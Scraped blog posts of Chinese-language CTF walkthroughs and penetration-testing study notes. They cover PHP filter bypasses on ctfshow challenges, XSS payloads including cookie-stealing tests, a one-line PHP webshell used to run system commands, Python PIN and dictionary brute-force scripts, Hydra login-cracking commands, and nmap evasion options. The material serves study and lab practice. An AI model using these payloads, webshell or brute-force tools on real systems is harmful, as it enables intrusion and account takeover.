备份的sql文件\nweb18:这是一个javascript 的游戏，游戏的目的就是让要赢，从js代码中可知，当score\u0026gt;120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score=130 game_over=false 然后，执行游戏 的run() 即可得到 \u0026ldquo;你赢了，去幺幺零点皮爱吃皮看看\u0026rdquo;， 即，110.php 打开它，即得flag\nweb19:js查看源码，得知post提交账户密码，用hackbar\nweb20：mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}\nweb89\nisset() 用于检查 $_GET['num'] 是否存在。如果变量存在且值不为 NULL，则返回 true，否则返回 false。 preg_match() 用于检查 $_GET['num'] 是否包含数字字符。如果模式匹配到，则返回 1，否则返回 0。 intval() 用于将 $_GET['num'] 转换为整数并检查其是否为非零值。返回变量的整数值 利用数组绕过正则表达式，?num[]=1\nweb90\n绕过十进制，我采用转换成16进制方法，?num=0x117c\nweb91\n正则表达式修饰符\n1 /^php$/im /^php$/：匹配字符串 \u0026ldquo;php\u0026rdquo;。 i：忽略大小写。 m：多行匹配，若存在换行\\n且有开始^或结束$，以换行为分隔符，逐行匹配 1 %0A` 表示换行符（`\\n payload：?cmd=%0aphp\nweb92\n方法一:intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以\n方法二:同web90\nweb93\n既然不能有字母，传换成八进制，?num=010574\nweb94\n在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0\n1 if(!strpos($num, \u0026#34;0\u0026#34;))//0不能放在第一位 web95\n1 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num))//点匹配没了 可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574\nweb96\n在linux下面表示当前目录是 ./ 所以我们的payload： u=./flag.php\n不能直接?u=flag.php会被过滤\nweb97（这题不太懂其实）\nmd5绕过原理：md5对数组是不予加密的，但是这个函数是返回值类型的，没有返回对象，便是返回null（null是无对象的意思，可以理解为没有目标）,所以两个都是null，可以绕过里面的比较，但是外面还有一个a!=b,绕过姿势为：?a[]=1\u0026amp;b[]=2\nweb98\n三元运算符，if使用\n(expr1)?(expr2)：(expr3)\n如果expr1成立，则执行expr2，否则执行expr3\n1 $_GET=\u0026amp;$_POST;//只要有输入的get参数就将get方法改变为post方法 我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag,get直接url？，post用hackbar\nweb99\nfile_put_contents()写入文件\n1 弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的,满足条件，同时进入下一步后，我们就可将一句话木马写入了5.php中 get:?n=5.php post:content=\u003c?php @eval=$_POST=['hack'];?\u003e\n查看post:content=\u003c?php system('ls');?\u003e ,查看flag：content=\u003c?php system('tac flag36d.php');?\u003e\nweb100\n三个参数 v1 ，v2 ，v3，其中v0 实际上只会去判断v1是否为数字 ，因此v1 = 1234 数字即可\n1 2 3 4 5 6 7 8 9 if($v0){ if(!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)){ # 表示v2中不能有符号 ； if(preg_match(\u0026#34;/\\;/\u0026#34;, $v3)){ #表示v3 中必须要有 ; eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); # 这里是eval中 拼接v2 v3 } } } v2=var_dump($ctfshow)/* v3=*/; 拼接起来就是var_dump($ctfshow)/ (\u0026lsquo;ctfshow\u0026rsquo;) / ; 可以执行\nv2 也可以用其他显示输出的函数\n1 v2=print_r($ctfshow)/*\u0026amp;v3=*/; 注意拼接之后要把v3注释掉，flag要把02xd换成-\n","date":"2025-02-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/","title":"ctfshow通关"},{"content":"HTTP请求：抓包，把GET换成CTFHUB\n302跳转：网页临时移动到新的位置，而浏览器的缓存没有更新，flag在index.php下而跳转到index.html打开burp suite抓包，发送请求\ncookie:验证身份 抓包repeater模块改成admin=1发送请求\n基础认证：burpsuite字典爆破，加密\nsql注入：结合burpsuite（前端没有回显），hackbar\nXSS攻击 找一个xss网站，我找的是xssaq.com\n反射型XSS 恶意JavaScript脚本属于用户发送给网站请求中的一部分，随后网站又将这部分返回给用户，恶意脚本在页面中被执行。一般发生在前后端一体的应用中，服务端逻辑会改变最终的网页代码。\n攻击步骤\n1.攻击者构造出特殊的 URL，其中包含恶意代码。 2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。 3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n由于HTML文档具有扁平的、串行的结构，混合了控制语句、格式和实际内容，因此在结果页面中包含任何未经验证的用户提供的数据而没有进行正确的HTML编码，可能导致标记注入。一个经典的潜在攻击向量例子是站点搜索引擎：如果用户搜索一个字符串，搜索字符串通常会在结果页面上逐字显示，以表明搜索内容。如果该响应没有正确转义或拒绝HTML控制字符，就会导致跨站脚本漏洞。\n反射型攻击通常通过电子邮件或一个中立的网站传递。诱饵是一个看似无害的URL，指向一个可信赖的网站，但包含XSS攻击向量。如果该可信赖的网站对该向量存在漏洞，点击链接可能会导致受害者的浏览器执行注入的脚本。\n这里用最经典的paylaod来进行判断是否存在xss\n1 \u0026#34;\u0026#34;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026#34;//这是语句是让浏览器弹框 题目中第二个输入框模拟受害者访问，这里的payload需要从xss平台中复制\n在XSS网站上\n存储型XSS 黑客将恶意 JavaScript 脚本长期保存在服务端数据库中，用户一旦访问相关页面数据，恶意脚本就会被执行。常见于搜索、微博、社区贴吧评论等。 存储型 XSS 的攻击步骤：\n1.攻击者将恶意代码提交到目标网站的数据库中。 2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。 3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n和上面的是一样的，存储型就是把恶意代码存储进了数据库，每次查库就会触发恶意代码。\nDOM型XSS攻击 DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。\n在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等\nDOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。\n在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等 DOM型XSS的攻击步骤\n攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL。 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 简单来说就是在前端页面上寻找注入点\n通过构造html语法的闭合，将脚本输入进去，同前面一样\nDOM跳转 审查源代码\n注意！当你将类似于 \u0026lsquo;\u0026lsquo;\u0026rsquo;location.href = \u0026ldquo;javascript:alert(\u0026lsquo;xss\u0026rsquo;)\u0026rdquo;\u0026rsquo;\u0026rsquo;\u0026rsquo; 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。\n直接在网页url后面跟上代码测试反弹\n1 \u0026#39;\u0026#39;\u0026#39;javascript:alert(1)\u0026#39;\u0026#39;\u0026#39; 跟前面老步骤\n文件上传 文件上传漏洞服务端代码未对客户端上传的文件进行严格的验证，导致漏洞。非法用户可以利用上传的恶意文件控制整个网站，这个恶意文件被称为 WebShell ，也可以称为一种网页后门。 1.1常见的WebShell有哪些？\n拥有较完整功能的webshell，我们一般称为大马。 功能简易的webshell称为小马。 除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称。 1.2 一句话木马演示\n","date":"2025-02-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfhub-web/","title":"ctfhub-web"},{"content":"UDP TCP 客户端 服务器\nsocket实例化 socket(family,type,[protocal])协议族（默认AF_INET),,SOCK_STREAM(TCP)/SOCK_DGRAM(UDP)\ns=socket.socket()\n初始化TCP:s=socket.socket()\n初始化UDP:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\nsocket常用函数 服务器 s.bind((\u0026lsquo;127.0.0.1\u0026rsquo;,2345))绑定IP和端口\ns.listen(5)最大监听5个端口\nconn,address=s.accept()套字对象，客户端地址（本机）\n客户端 s.connect((\u0026ldquo;127.0.0.1\u0026rdquo;,2345))\n通用 send()\nsendall()区别在于可以完整发送TCP数据\ns.snedall(bytes(\u0026ldquo;Hello\u0026rdquo;,encoding=\u0026ldquo;utf-8\u0026rdquo;))\nrecv(bufsize)最多可以接受的数量\nsendto(string[,flag],address)使用UDP时发送数据\nrecovfrom(data,address) UDP专用，接受数据\nclose()关闭socket\nnmap实例化 nm = nmap.PortScannerAsycn()\n常见函数 scan(self,hosts=\u0026ldquo;127.0.0.1\u0026rdquo;,ports=None,arguments=\u0026quot;-sV\u0026quot;,sudo=False)\nnm.scan(\u0026ldquo;127.0.0.1\u0026rdquo;,\u0026ldquo;1-500\u0026rdquo;,\u0026quot;-sS\u0026quot;)1-500端口\nnm.all_hosts()返回被扫描的所有主机列表\nnm.command_line()返回再当前扫描中使用的命令行\nnm.csv()返回被扫描主机的csv格式的文件\nprint（nm.csv())希望看得更清楚\nnm.has_hsot检查是否有host扫描结果，返回值为false/true\nnm.scaninfo()列出扫描信息的结构\nnmp[\u0026ldquo;192.168.1.101\u0026rdquo;].hostname()获取192.168.1.1.1的主机名\nstill_scanning()是否正在扫描\nwait（2）等待时间\nstop（）停止当前扫描\n","date":"2025-02-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/python%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","title":"Python渗透测试"},{"content":"DNS侦察 DNSMAP DNS枚举并保存为txt DNSRecon A:IP MX:邮箱 NS:名称服务器 TXT:文本 ​ IP地址反向查询\nfierce 目标子域名和IP 主机枚举 ATK6 枚举主机，发现新设备，发起拒绝服务攻击，利用已知漏洞；检测内网中存活的IPv6主机\nhping3 发送ICMP请求，DDoS攻击，扫描主机端口，Fin扫描\nnmap 6种端口状态，\u0026ndash;spoof-mac -伪造nmap所在主机地址，-f分段处理加大目标主机上防火墙的拦截难度，-D RND指定生成数量的伪造的随机IP地址，\u0026ndash;data-string\u0026quot;\u0026ldquo;将自定义字符串（ASCII码）插入数据包\n指纹识别 wappalyzer火狐插件\nwhatweb 修改请求消息HTTP -H：Snowwolf -U：Chrome，识别CMS,博客平台，中间件，Web框架模块，网站服务器，脚本，IP，cookie\nWAF识别 防火墙 wafw00f \u0026ndash;proxy=代理地址\n目录扫描 dirb 需要登陆后的网站 -c “Cookie：\u0026hellip;.\u0026rdquo; 隐藏攻击者主机 -a dirbuster 图形化界面 gobuster ffuf -w指定字典文件 -u url Wfuzz web应用程序的模糊测试工具，发现Web应用程序的隐藏资源 -w字典文件 \u0026ndash;hc 404 url/FUZZ ​ 枚举php文件 FUZZ.php\n​ 使用Wfuzz枚举用户名和密码\n​ -f output.html保存为html文件在浏览器种打开\n漏洞数据库 searchsploit 可以与nmap联动 nmap url -sV -oX nmap.xml//-oX将扫描结果保存到一个XML文件中用于与searchsploit工具联动，输入searchsploit \u0026ndash;nmap nmap.xml 谷歌Hacking语法\n批量寻找网站后台 inurl：\nintext：\nintitle：\n指定网站寻找后台 site： inurl:/intext:/intitle:\n指定返回文件类型 filetype：\n批量寻找目录遍历漏洞 intext：index of/admin\nintext:index of\n暴力攻击 破解PIN码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Try every possible 4-digit PIN (from 0000 to 9999) for pin in range(10000): formatted_pin = f\u0026#34;{pin:04d}\u0026#34; # Convert the number to a 4-digit string (e.g., 7 becomes \u0026#34;0007\u0026#34;) print(f\u0026#34;Attempted PIN: {formatted_pin}\u0026#34;) # Send the request to the server response = requests.get(f\u0026#34;http://{ip}:{port}/pin?pin={formatted_pin}\u0026#34;) # Check if the server responds with success and the flag is found if response.ok and \u0026#39;flag\u0026#39; in response.json(): # .ok means status code is 200 (success) print(f\u0026#34;Correct PIN found: {formatted_pin}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 运行\npython pin-solver.py\n字典攻击 字典攻击的有效性在于它能够利用人类倾向于优先选择容易记住的密码而不是安全的密码这一倾向。尽管屡次受到警告，但许多人仍然选择基于字典单词、常用短语、名称或容易猜测的模式等现成信息的密码。这种可预测性使他们容易受到字典攻击，攻击者会系统地针对目标系统测试预定义的潜在密码列表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests ip = \u0026#34;127.0.0.1\u0026#34; # Change this to your instance IP address port = 1234 # Change this to your instance port number # Download a list of common passwords from the web and split it into lines passwords = requests.get(\u0026#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt\u0026#34;).text.splitlines() # Try each password from the list for password in passwords: print(f\u0026#34;Attempted password: {password}\u0026#34;) # Send a POST request to the server with the password response = requests.post(f\u0026#34;http://{ip}:{port}/dictionary\u0026#34;, data={\u0026#39;password\u0026#39;: password}) # Check if the server responds with success and contains the \u0026#39;flag\u0026#39; if response.ok and \u0026#39;flag\u0026#39; in response.json(): print(f\u0026#34;Correct password found: {password}\u0026#34;) print(f\u0026#34;Flag: {response.json()[\u0026#39;flag\u0026#39;]}\u0026#34;) break 1 python3 dictionary-solver.py Hydra 为 Hydra 构建 params 字符串 Form Parameters：这些是保存用户名和密码的基本字段。Hydra 将动态地用单词列表中的值替换这些参数中的占位符（^USER^和）。^PASS^\nAdditional Fields：如果表单包含其他隐藏字段或令牌（例如 CSRF 令牌），则它们也必须包含在params字符串中。如果它们的值随每次请求而变化，则它们可以具有静态值或动态占位符。\nSuccess Condition：这定义了 Hydra 用来识别成功登录的标准。它可以是 HTTP 状态代码（例如S=302重定向）或服务器响应中特定文本的存在或不存在（例如F=Invalid credentials或S=Welcome）。\nHydra 命令的一般结构http-post-form如下：\n1 hydra [options] target http-post-form \u0026#34;path:params:condition_string\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; 1 hydra ... http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:S=302\u0026#34; 我们将使用top-usernames-shortlist.txt作为用户名列表，使用2023-200_most_used_passwords.txt作为密码列表。\n例：\n1 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.63.74 -s 35392 http-post-form \u0026#34;/login:user=^USER^\u0026amp;pass=^PASS^:F=Invalid credentials\u0026#34; ","date":"2025-01-20T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90/","title":"脚本小子"},{"content":"Web应用程序 缺陷 真实场景 SQL 注入 获取 Active Directory 用户名并对 VPN 或电子邮件门户执行密码喷洒攻击。 文件包含 阅读源代码以查找隐藏的页面或目录，这些页面或目录公开了可用于获取远程代码执行的附加功能。 不受限制的文件上传 允许用户上传个人资料图片的 Web 应用程序，允许上传任何类型的文件（不仅仅是图片）。可以利用此功能通过上传恶意代码来完全控制 Web 应用程序服务器。 不安全的直接对象引用（IDOR） 当与访问控制失效等缺陷相结合时，这通常可用于访问其他用户的文件或功能。例如，在浏览到 /user/701/edit-profile 等页面时编辑您的用户个人资料。如果我们可以将 更改701为702，我们就可以编辑其他用户的个人资料！ 访问控制失效 另一个示例是允许用户注册新帐户的应用程序。如果帐户注册功能设计不佳，用户可能会在注册时执行权限提升。考虑POST注册新用户时的请求，该请求提交数据username=bjones\u0026amp;password=Welcome1\u0026amp;email=bjones@inlanefreight.local\u0026amp;roleid=3。如果我们可以操纵roleid参数并将其更改为0或会怎样1？我们已经看到了这种情况的真实应用程序，并且可以快速注册管理员用户并访问 Web 应用程序的许多非预期功能。 Web程序布局 层：\n类别 描述 Web Application Infrastructure 描述 Web 应用程序按预期运行所需的组件（如数据库）的结构。由于 Web 应用程序可以设置为在单独的服务器上运行，因此了解它需要访问哪个数据库服务器至关重要。 Web Application Components 组成 Web 应用程序的组件代表与 Web 应用程序交互的所有组件。这些组件分为以下三个区域：UI/UX、Client和Server组件。 Web Application Architecture 架构包括各个 Web 应用程序组件之间的所有关系。 Web 应用程序基础设施 Client-ServerWeb 应用程序通常采用该client-server模型。服务器以客户端-服务器模型托管 Web 应用程序，并将其分发给任何尝试访问它的客户端。在这种模型中，Web 应用程序有两种类型的组件：前端组件，通常在客户端（浏览器）上解释和执行；后端组件，通常由托管服务器编译、解释和执行。 One Server如果任何托管的 Web 应用程序存在漏洞，则整个 Web 服务器都会受到漏洞。 Many Servers - One Database此模型将数据库分离到其自己的数据库服务器上，并允许 Web 应用程序的托管服务器访问数据库服务器以存储和检索数据。只要数据库分离在其自己的数据库服务器上，就可以将其视为多服务器对一个数据库和单服务器对一个数据库。这种模型的主要优势 ( from a security point of view) 是分段，其中 Web 应用程序的每个主要组件都单独放置和托管。如果一个 Web 服务器受到攻击，其他 Web 服务器不会受到直接影响。 Many Servers - Many DatabasesWeb 应用程序只能访问私有数据和跨 Web 应用程序共享的公共数据。也可以将每个 Web 应用程序的数据库托管在其单独的数据库服务器上。这种设计还被广泛用于冗余目的，因此如果任何 Web 服务器或数据库脱机，备份将代替其运行，以尽可能减少停机时间。 Web应用程序组件 `Client\nServer\n网络服务器 Web 应用程序逻辑 数据库 Services\n（微服务）\n第三方集成 Web 应用程序集成 `Functions（无服务器）\n敏感数据泄露 敏感数据泄露是指最终用户可以以明文形式获取敏感数据ctrl + u`通过 Web 代理（如）键入或查看页面源代码Burp Suite\n有时，我们可能会发现登录名credentials、hashes或其他敏感数据隐藏在网页源代码的注释中或JavaScript正在导入的外部代码中。其他敏感信息可能包括暴露的链接或目录，甚至暴露的用户信息，所有这些都可能被利用来进一步访问 Web 应用程序或 Web 应用程序的支持基础设施\nHTML注入 HTML 注入是指未经过滤的用户输入显示在页面上。这可以通过检索之前提交的代码（例如从后端数据库检索用户评论）或直接在JavaScript前端显示未经过滤的用户输入来实现。\n1 \u0026lt;a href=\u0026#34;http://www.hackthebox.com\u0026#34;\u0026gt;Click Me\u0026lt;/a\u0026gt; 跨站点脚本XSS HTML Injection漏洞通常还可用于通过注入要在客户端执行的代码来执行跨站点脚本 (XSS)攻击。一旦我们可以在受害者的机器上执行代码，我们就有可能访问受害者的帐户甚至他们的机器。在实践中与非常相似。但是，涉及注入代码以在客户端执行更高级的攻击，而不仅仅是注入 HTML 代码。主要有三种类型：\n类型 描述 Reflected XSS 当用户输入经过处理（例如搜索结果或错误消息）显示在页面上时发生。 Stored XSS 当用户输入存储在后端数据库并在检索时显示（例如，帖子或评论）时发生。 DOM XSS 当用户输入直接显示在浏览器中并写入HTMLDOM 对象（例如，易受攻击的用户名或页面标题）时发生。 1 #\u0026#34;\u0026gt;\u0026lt;img src=/ onerror=alert(document.cookie)\u0026gt; 显示当前用户的cookie\n后端服务器 软件\nWeb Server Database Development Framework Combinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. 组件\nCombinations Components LAMP Linux, Apache, MySQL, and PHP. WAMP Windows, Apache, MySQL, and PHP. WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP. XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL. 硬件\nHTTP响应代码：\n成功的响应 200 OK 请求已成功 重定向消息 301 Moved Permanently 请求资源的 URL 已永久更改 302 Found 请求资源的 URL 已临时更改 客户端错误响应 400 Bad Request 由于语法无效，服务器无法理解请求 401 Unauthorized 未经身份验证尝试访问页面 403 Forbidden 客户端无权访问内容 404 Not Found 服务器找不到请求的资源 405 Method Not Allowed 请求方法已被服务器所知，但已被禁用，无法使用 408 Request Timeout 某些服务器会在空闲连接上发送此响应，即使客户端之前没有任何请求 服务器错误响应 500 Internal Server Error 服务器遇到了不知道如何处理的情况 502 Bad Gateway 服务器在作为网关获取处理请求所需的响应时，收到了无效响应 504 Gateway Timeout 服务器作为网关，无法及时得到响应 端口有两种类型：传输控制协议 (TCP)和用户数据报协议 (UDP) Port(s) Protocol 20/21 (TCP) FTP 22 (TCP) SSH 23 (TCP) Telnet 25 (TCP) SMTP 80 (TCP) HTTP 161 (TCP/UDP) SNMP 389 (TCP/UDP) LDAP 443 (TCP) SSL/TLS (HTTPS) 445 (TCP) SMB 3389 (TCP) RDP shell连接 shell类型 描述 Reverse shell 启动与攻击箱上的“监听器”的连接。 Bind shell “绑定”到目标主机上的特定端口并等待来自我们的攻击箱的连接。 Web shell 通过 Web 浏览器运行操作系统命令，通常不是交互式或半交互式的。它还可用于运行单个命令（即利用文件上传漏洞并上传PHP脚本来运行单个命令）。 渗透测试流程 tmux tmux new -s \u0026lt;名称\u0026gt;\n执行命令 ctrl+b+ d\n重新连接tmux attach -t \u0026lt;名称\u0026gt;\ntmux ls展示所有会话\nnmap 例：nmap 10.129.42.253\n运行 Nmap 脚本的语法是`nmap \u0026ndash;script ","date":"2025-01-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/","title":"Web应用程序"},{"content":" TCP扫描，默认常用 1 sudo nmap -sS localhost 发现主机 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 扫描选项 描述 10.129.2.0/24 目标网络范围。 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 Firewall and IDS Evasion此扫描方法仅在主机的防火墙允许的情况下才有效\n禁用端口扫描，则会启用ICMP扫描\n扫描IP列表 1 cat hosts.lst 这可能意味着其他主机由于其防火墙配置而忽略了默认的ICMP 回应请求Nmap。由于没有收到响应，它会将这些主机标记为非活动状态\n对预定义列表使用相同的扫描技术\n1 sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\u0026#34; \u0026#34; -f5 扫描选项 描述 -sn 禁用端口扫描。 -oA tnet 以名称“tnet”开头的所有格式存储结果。 -iL 对提供的“hosts.lst”列表中的目标执行定义的扫描。 为了确保发送了 ICMP 回显请求，\nICMP 回显请求 ( -Pn)、DNS 解析 ( -n) 和 ARP ping 扫描 ( --disable-arp-ping)。 1 sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\u0026#34; \u0026#34; -f5 1 sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace 扫描选项 描述 10.129.2.18 对目标执行定义的扫描。 -sn 禁用端口扫描。 -oA host 以名称“host”开头的所有格式存储结果。 -PE 使用“ICMP Echo 请求”对目标执行 ping 扫描。 --packet-trace 显示所有发送和接收的数据包 1 sudo nmap 10.129.2.18 -sn -oA host -PE --reason 扫描选项 描述 10.129.2.18 对目标执行定义的扫描。 -sn 禁用端口扫描。 -oA host 以名称“host”开头的所有格式存储结果。 -PE 使用“ICMP Echo 请求”对目标执行 ping 扫描。 --reason 显示特定结果的原因。 主机和端口扫描 在发现目标还活着之后，我们希望更准确地了解系统。我们需要的信息包括：\n开放端口及其服务 服务版本 服务提供的信息 操作系统 扫描端口六种情况：\n状态 描述 open 这表示已建立与扫描端口的连接。这些连接可以是TCP 连接、UDP 数据报以及SCTP 关联。 closed 当端口显示为关闭时，TCP 协议会指示我们收到的数据包包含一个RST标志。这种扫描方法还可用于确定我们的目标是否还活着。 filtered Nmap 无法正确识别扫描的端口是打开还是关闭，因为目标没有返回该端口的响应，或者我们从目标收到错误代码。 unfiltered 端口的这种状态仅在TCP-ACK扫描期间发生，表示该端口可访问，但无法确定它是开放还是关闭。 `open filtered` `closed filtered` 扫描前 10 个 TCP 端口 1 sudo nmap 10.129.2.28 --top-ports=10 扫描选项 描述 10.129.2.28 扫描指定目标。 --top-ports=10 扫描已被定义为最频繁的指定顶级端口。 Nmap——跟踪数据包 1 sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping 扫描选项 描述 10.129.2.28 扫描指定目标。 -p 21 仅扫描指定端口。 --packet-trace 显示所有发送和接收的数据包。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 信息 描述 SENT (0.0429s) 表示Nmap的SENT操作，向目标发送数据包。 TCP 显示用于与目标端口交互的协议。 10.10.14.2:63090 \u0026gt; 代表我们的 IPv4 地址和源端口，Nmap 将使用它们来发送数据包。 10.129.2.28:21 显示目标 IPv4 地址和目标端口。 S 发送的TCP数据包的SYN标志。 ttl=56 id=57322 iplen=44 seq=1699105818 win=1024 mss 1460 附加的 TCP 标头参数。 连接扫描 Nmap TCP 连接扫描( -sT) 使用 TCP 三次握手来确定目标主机上的特定端口是打开还是关闭。\n1 sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT 该Connect扫描（也称为完整 TCP 连接扫描）非常准确，因为它完成了三次 TCP 握手，使我们能够确定端口的确切状态（打开、关闭或过滤）。但是，它并不是最隐蔽的。\n过滤端口 防火墙drops会扫描我们发送的 TCP 数据包。因此，我们扫描 TCP 端口139，该端口已显示为已过滤。为了能够跟踪我们发送的数据包的处理方式，我们再次停用 ICMP 回显请求 ( -Pn)、DNS 解析 ( -n) 和 ARP ping 扫描 ( --disable-arp-ping)。\n1 sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn 发现开放的 UDP 端口 1 sudo nmap 10.129.2.28 -F -sU 扫描选项 描述 10.129.2.28 扫描指定目标。 -F 扫描前 100 个端口。 -sU 执行 UDP 扫描。 一些系统管理员有时会忘记过滤除 TCP 端口之外的 UDP 端口，但UDP比TCP慢的多\n这样做的另一个缺点是，我们经常得不到响应，因为Nmap向扫描的 UDP 端口发送空数据报，并且我们没有收到任何响应。所以我们无法确定 UDP 数据包是否已经到达。如果 UDP 端口为open，则只有在应用程序配置为这样做的情况下，我们才会收到响应。\n版本扫描 1 sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason -sV 扫描选项 描述 10.129.2.28 扫描指定目标。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 -p 445 仅扫描指定端口。 --reason 显示端口处于特定状态的原因。 -sV 执行服务扫描。 扫描端口的另一种方便方法是-sV使用选项从开放端口获取其他可用信息。此方法可以识别版本、服务名称和有关目标的详细信息。\n保存结果 Nmap可以以 3 种不同的格式保存结果。\n正常输出（-oN）.nmap文件扩展名 带有文件扩展名的Grepable 输出（-oG）.gnmap XML 输出 ( -oX)，.xml文件扩展名 我们还可以指定选项（-oA）以所有格式保存结果。命令可能如下所示：\n1 sudo nmap 10.129.2.28 -p- -oA target 扫描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -oA target 以所有格式保存结果，每个文件的名称以“目标”开头。 1 target.gnmap target.xml target.nmap 转换格式 要将存储的结果从 XML 格式转换为 HTML，我们可以使用该工具xsltproc。\n1 xsltproc target.xml -o target.html 服务枚举 服务版本检测 1 sudo nmap 10.129.2.28 -p- -sV 描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -sV 对指定端口执行服务版本检测。 增加verbosity level（-v/ -vv），当检测到开放端口时，它将直接显示给我们Nmap\n1 sudo nmap 10.129.2.28 -p- -sV -v 扫描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -sV 对指定端口执行服务版本检测。 -v 增加扫描的详细程度，以显示更详细的信息。 横幅抓取 Nmap则尝试通过基于签名的匹配系统识别它们，但这会大大增加扫描的持续时间。Nmap所呈现结果的一个缺点是自动扫描可能会遗漏一些信息，因为有时Nmap不知道如何处理它。\n某些服务可能不会立即提供此类信息。也可以从相应的服务中删除或操纵横幅。如果我们manually使用 连接到 SMTP 服务器nc，抓取横幅，并使用 拦截网络流量tcpdump，我们就可以看到Nmap未显示的内容。\n传输控制包Tcpdump 1 sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28 nc 1 nc -nv 10.129.2.28 25 Nmap脚本引擎 它为我们提供了在 Lua 中创建脚本以与某些服务进行交互的可能性。这些脚本总共可分为 14 个类别：\n类别 描述 auth 确定身份验证凭证。 broadcast 通过广播来发现主机的脚本以及发现的主机可以自动添加到剩余的扫描中。 brute 执行脚本，尝试通过使用凭证进行暴力破解来登录相应的服务。 default 使用该-sC选项执行的默认脚本。 discovery 无障碍服务的评估。 dos 